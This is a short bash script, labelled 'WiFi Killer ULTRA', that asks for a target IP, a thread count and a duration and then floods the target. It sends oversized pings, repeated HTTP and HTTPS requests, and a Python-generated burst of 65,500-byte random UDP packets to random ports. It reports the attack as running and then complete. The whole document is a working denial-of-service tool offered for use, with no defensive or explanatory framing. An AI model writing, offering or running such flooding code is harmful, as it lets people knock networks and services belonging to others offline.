#!/bin/bash
echo "=== WiFi Killer ULTRA ==="
read -p "Target IP: " ip
read -p "Threads (100-500): " threads
read -p "Durasi (detik): " dur

for i in $(seq 1 $threads); do
    ping -s 65500 -c 1 $ip > /dev/null 2>&1 &
    curl -s -o /dev/null http://$ip &
    curl -s -o /dev/null https://$ip &
    python3 -c "import socket, random, time; s=socket.socket(socket.AF_INET, socket.SOCK_DGRAM); [s.sendto(bytes(random.randint(0,255) for _ in range(65500)), ('$ip', random.randint(1,65535))) for _ in range(100)]" &
done

echo "[✔] Attack running for $dur seconds..."
sleep $dur
echo "[✔] Attack complete!"
